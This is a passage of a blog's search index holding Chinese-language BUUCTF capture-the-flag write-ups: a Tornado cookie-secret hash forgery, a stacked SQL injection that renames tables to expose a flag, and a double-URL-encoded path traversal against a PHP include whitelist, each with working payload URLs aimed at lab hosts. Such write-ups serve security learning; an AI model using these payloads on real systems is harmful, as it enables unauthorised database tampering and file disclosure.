punctuation">}</span></code></pre><p>å¾—åˆ°cookie_secret</p><pre class=" language-bash"><code class="language-bash"><span class="token string">'cookie_secret'</span><span class="token keyword">:</span> <span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span><span class="token punctuation">}</span></code></pre><p>ç„¶åå†™ä¸€ä¸ªè„šæœ¬å¾—åˆ°æœ€åçš„filehash</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>    md5<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>    cookie_secret<span class="token operator">=</span><span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æœ€åçš„filehashä¸º</p><pre class=" language-bash"><code class="language-bash">16a4ec873339e7847bf28e0e0b33803e</code></pre><p>ç„¶åæ„é€ payloadä¸º</p><pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/file?filename<span class="token operator">=</span>/fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>16a4ec873339e7847bf28e0e0b33803e</code></pre><p>å¾—åˆ°flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/6.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> æ¨¡æ¿æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF å¼ºç½‘æ¯-éšä¾¿æ³¨</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œçœ‹åˆ°è¿™æ ·çš„é¡µé¢<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/1.jpg" alt=""></p><a id="more"></a><p>åŠ â€™å¼•å·æµ‹è¯•<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/2.jpg" alt=""><br>æŠ¥é”™<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/3.jpg" alt=""><br>åŠ æ³¨é‡Š<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/4.jpg" alt=""><br>æ¢å¤æ­£å¸¸ï¼Œæ‰€ä»¥å¯ä»¥åˆ¤æ–­æ˜¯å•å¼•å·çš„æ³¨å…¥</p><p>ä¹‹åå¼€å§‹åˆ¤æ–­åˆ—æ•°<br>order byæµ‹è¯•åˆ°3çš„æ—¶å€™æŠ¥é”™<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/5.jpg" alt=""><br>æ‰€ä»¥ä¸€å…±æœ‰ä¸¤åˆ—<br>åˆ¤æ–­å®Œåˆ—æ•°ï¼Œå¼€å§‹unionæ³¨å…¥ï¼Œä½†å›æ˜¾å‘Šè¯‰æˆ‘ä»¬è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/6.jpg" alt=""><br>ä¹‹åå°è¯•äº†è®¸å¤šæ–¹æ³•æƒ³è¦ç»•è¿‡ï¼Œä½†éƒ½æ²¡æœ‰ä»€ä¹ˆæ•ˆæœ<br>ç„¶åå°±æ˜¯å­¦åˆ°çš„æ–°ä¸œè¥¿äº†ï¼Œå †å æ³¨å…¥<br>é¦–å…ˆç”¨show databases;çˆ†åº“<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/7.jpg" alt=""><br>ç„¶åshow tables;æŠ¥è¡¨<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/8.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰ä¸¤ä¸ªè¡¨<br>wordså’Œ1919810931114514<br>ç„¶åæŸ¥è¯¢wordsè¡¨é‡Œæ‰€æœ‰çš„åˆ—</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span></code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/9.jpg" alt=""><br>wordsè¡¨é‡Œä¸€å…±ä¸¤åˆ—ï¼Œidå’Œdataï¼Œç»“åˆæˆ‘ä»¬ç”¨1æŸ¥è¯¢å‡ºæ¥çš„ç»“æœï¼Œä¹Ÿæ˜¯ä¸€ä¸ªåºå·ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åŸºæœ¬ç¡®å®šæˆ‘ä»¬å½“å‰æ‰€åœ¨çš„è¡¨å°±æ˜¯wordsè¡¨<br>å†æŸ¥è¯¢1919810931114514è¡¨çš„åˆ—</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token punctuation">(</span>çº¯æ•°å­—éœ€è¦ç”¨åå¼•å·æ‹¬èµ·æ¥<span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/10.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°è¿™ä¸ªè¡¨é‡Œé¢æœ‰æˆ‘ä»¬éœ€è¦çš„flag<br>é‚£ä¹ˆè¯¥å¦‚ä½•è·å–flagå‘¢</p><p>æˆ‘ä»¬å¯ä»¥å°†wordsè¡¨æ”¹æˆå¦å¤–ä¸€ä¸ªåå­—ï¼Œç„¶åå°†1919810931114514è¡¨æ”¹ä¸ºwordsï¼Œè¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬åªéœ€è¦æŸ¥è¯¢wordsè¡¨å°±èƒ½å¾—åˆ°flag<br>payloadå¦‚ä¸‹</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//417fcd6d-dfd6-4e25-a790-5178dd3c699b.node3.buuoj.cn/?inject=1%27;alter table words rename to word;alter table `1919810931114514` rename to words;alter table words change flag data varchar(100);alter table words add column id int(10)--+</span></code></pre><p>æ³¨ï¼šè¿™é‡Œè¦æ³¨æ„å‡ ä¸ªé—®é¢˜ï¼š</p><pre><code>å¯¹åˆ—åè¿›è¡Œæ›´æ”¹æ—¶ï¼Œè¦åœ¨åé¢æŒ‡å®šä¿®æ”¹åçš„æ•°æ®ç±»å‹æ·»åŠ idåˆ—æ—¶ï¼Œè®¾ç½®é»˜è®¤å€¼ï¼Œæ–¹ä¾¿åé¢æŸ¥è¯¢</code></pre><p>æ‰§è¡Œå®Œpayloadåï¼Œç„¶åå†æŸ¥è¯¢1â€™ and â€˜1â€™=â€™1å°±å¯ä»¥å¾—åˆ°flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/11.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å †å æ³¨å…¥ </tag>
            
            <tag> ä¿®æ”¹è¡¨åå’Œåˆ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF warmup</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-warmup/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-warmup/</url>
      
        <content type="html"><![CDATA[<p>ä»£ç å®¡è®¡é¢˜ç›®<br>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æç¤º</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--source.php--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>è®¿é—®source.php</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span> </code></pre><p>ä»£ç å®¡è®¡<br>æœ‰ä¸€ä¸ªcheckFileæ–¹æ³•ï¼Œè§„å®šäº†ç™½åå•</p><pre class=" language-php"><code class="language-php"><span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>ç™½åå•å†…æœ‰ä¸€ä¸ªhint.phpï¼Œè®¿é—®ä¸€ä¸‹</p><pre class=" language-bash"><code class="language-bash">flag not here, and flag <span class="token keyword">in</span> ffffllllaaaagggg</code></pre><p>å¾—åˆ°è¿™æ ·çš„æç¤ºï¼Œå†ç»§ç»­å®¡è®¡ä»£ç </p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>éœ€è¦è®¾å®špageå‚æ•°å¹¶ä¸”pageè¦æ˜¯å­—ç¬¦</p><pre class=" language-php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>mb_substræ˜¯æˆªå–å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œmb_strposå‡½æ•°åˆ™æ‰¾å‡ºå­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹<br>æ‰€ä»¥ä¸Šé¢ä»£ç çš„ä½œç”¨å°±æ˜¯ï¼Œæˆªå–pageåˆ°ï¼Ÿç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span></code></pre><p>å¦‚æœæˆªå–ä¹‹åçš„_pageåœ¨ç™½åå•å†…åˆ™è¿”å›çœŸ<br>ç¬¬ä¸€æ¬¡æˆªå–ä¹‹åå†å¯¹pageè¿›è¡Œä¸€æ¬¡urlè§£ç </p><pre class=" language-php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è§£ç ä¹‹ååœ¨å¯¹å…¶è¿›è¡ŒåŒæ ·çš„æˆªå–æ“ä½œ<br>åŒæ ·çš„ï¼Œå¦‚æœæˆªå–åˆ°çš„_pageåœ¨ç™½åå•å†…åˆ™è¿”å›çœŸ</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  </code></pre><p>è¿™ä¸€å—ä»£ç çš„å«ä¹‰æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬è®¾å®šäº†fileå‚æ•°ï¼Œå¹¶ä¸”æ»¡è¶³fileå‚æ•°æ˜¯å­—ç¬¦ä¸²å’Œcheckfileæ–¹æ³•ï¼Œå°±è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå¦åˆ™å°±è¿”å›ä¸€å¼€å§‹æˆ‘ä»¬è§åˆ°çš„é‚£ä¸ªæ»‘ç¨½<br>å®¡è®¡å®Œäº†ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦ç†æ¸…æ€è·¯<br>1.flagåœ¨ffffllllaaaaggggé‡Œé¢<br>2.æˆ‘ä»¬çš„fileè¦æœ‰ç™½åå•å†…çš„æ–‡ä»¶<br>3.ä¸¤æ¬¡è§£ç (æœåŠ¡å™¨æœ¬èº«å°±ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œåç«¯åˆè¿›è¡Œä¸€æ¬¡è§£ç )åä¾ç„¶è¦æ»¡è¶³checkfileæ–¹æ³•<br>åŸºäºè¿™äº›è¦æ±‚ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿé€ å‡ºpayload</p><pre class=" language-bash"><code class="language-bash">http://2bd8af98-1fcf-46ca-9780-c09e216ffb5e.node3.buuoj.cn/?file<span class="token operator">=</span>source.php%253f<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/ffffllllaaaagggg</code></pre><p>?ç»è¿‡ä¸¤æ¬¡urlç¼–ç ä¹‹åæ˜¯%253fï¼Œåé¢çš„../æ˜¯ç”¨æ¥è¿›è¡Œç›®å½•ç©¿è¶Šçš„<br>è®¿é—®ä¸€ä¸‹å°±èƒ½å¾—åˆ°flag<br>flag{540b1ff4-daf1-472a-8d21-0a0c9a36884b} </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/LawlietLW.github.io/about/index.html"/>
      <url>/LawlietLW.github.io/about/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/LawlietLW.github.io/categories/index.html"/>
      <url>/LawlietLW.github.io/categories/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/LawlietLW.github.io/categories/index-1.html"/>
      <url>/LawlietLW.github.io/categories/index-1.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/LawlietLW.github.io/tags/index-1.html"/>
      <url>/LawlietLW.github.io/tags/index-1.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>contact</title>
      <link href="/LawlietLW.github.io/contact/index.html"/>
      <url>/LawlietLW.github.io/contact/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/LawlietLW.github.io/tags/index.html"/>
      <url>/LawlietLW.github.io/tags/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
  
</search>
